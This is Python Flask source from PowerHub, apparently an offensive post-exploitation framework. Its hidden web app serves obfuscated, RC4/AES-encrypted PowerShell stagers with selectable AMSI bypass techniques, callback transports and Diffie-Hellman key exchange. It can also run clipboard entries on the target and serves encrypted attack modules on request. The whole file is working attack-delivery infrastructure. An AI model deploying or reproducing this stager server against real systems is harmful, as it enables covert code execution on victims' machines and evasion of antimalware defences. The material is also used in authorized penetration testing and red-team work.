from base64 import b64encode
import binascii
import logging
import os

from flask import render_template, request, Response, Flask

from powerhub.tools import encrypt_rc4, encrypt_aes, compress
from powerhub.stager import import_modules, webdav_url, callback_urls
import powerhub.stager as phst
from powerhub.directories import XDG_DATA_HOME, BASE_DIR
from powerhub.obfuscation import get_stage
from powerhub.dhkex import DH_G, DH_MODULUS, DH_ENDPOINT
from powerhub.env import powerhub_app as ph_app
from powerhub import __version__

hidden_app = Flask(
    'hidden_app',
    template_folder=os.path.join(BASE_DIR, 'templates'),
)
hidden_app.templates_auto_reload = True

log = logging.getLogger(__name__)


@hidden_app.add_template_filter
def debug(msg):
    """This is a function for debugging statements in jinja2 templates"""
    if ph_app.args.DEBUG:
        return msg
    return ""


@hidden_app.add_template_filter
def rc4encrypt(msg):
    """This is a function for encrypting strings in jinja2 templates"""
    return b64encode(encrypt_rc4(msg.encode(), ph_app.key)).decode()


@hidden_app.add_template_filter
def rc4byteencrypt(data):
    """This is a function for encrypting bytes in jinja2 templates

    data must be hexascii encoded.
    """
    encrypted = encrypt_rc4(b64encode(binascii.unhexlify(data)), ph_app.key)
    return b64encode(encrypted).decode()


@hidden_app.route('/')
def stager():
    """Load the stager"""

    try:
        clipboard_id = int(request.args.get('c'))
        exec_clipboard_entry = ph_app.clipboard. \
            entries[clipboard_id].content
    except TypeError:
        exec_clipboard_entry = ""

    amsi_bypass = request.args.get('a', 'reflection')
    kex = request.args.get('k', 'dh')

    transport = request.args.get('t', 'http')
    context = {
        "modules": phst.modules,
        "callback_url": callback_urls[transport],
        "transport": transport,
        "webdav_url": webdav_url,
        "key": ph_app.key,
        "VERSION": __version__,
    }

    try:
        with open(os.path.join(XDG_DATA_HOME, "profile.ps1"), "r") as f:
            profile = f.read()
    except Exception as e:
        log.error("Error while reading profile.ps1: %s" % str(e))
        profile = ""

    stage3 = render_template(
        "powershell/powerhub.ps1",
        **context,
    )

    jinja_context = dict(
        callback=callback_urls[transport],
        kex=kex,
        DH_G=DH_G,
        DH_MODULUS=DH_MODULUS,
        dh_endpoint=DH_ENDPOINT,
    )
    result = get_stage(
        ph_app.key,
        amsi_bypass=amsi_bypass,
        stage3_strings=[stage3, profile, exec_clipboard_entry],
        jinja_context=jinja_context,
    )

    return Response(result, content_type='text/plain; charset=utf-8')


@hidden_app.route('/list')
def hub_modules():
    """Return list of hub modules"""
    reload = request.args.get('reload', '')
    if reload.lower() != 'false':
        phst.modules = import_modules()

    context = {
        "modules": phst.modules,
    }

    result = render_template(
        "powershell/modules.ps1",
        **context,
    ).encode()

    result = b64encode(encrypt_aes((result), ph_app.key))
    return Response(result, content_type='text/plain; charset=utf-8')


@hidden_app.route('/module')
def load_module():
    """Load a single module"""

    if 'm' not in request.args:
        return Response('error')

    n = int(request.args.get('m'))

    if n < len(phst.modules):
        phst.modules[n].activate()
        code = phst.modules[n].code

        if 'c' in request.args:
            encrypted = encrypt_aes(compress(code), ph_app.key)
            resp = b64encode(encrypted),
        else:
            resp = b64encode(encrypt_aes(code, ph_app.key)),

        return Response(
            resp,
            content_type='text/plain; charset=utf-8'
        )
    else:
        return Response("not found")
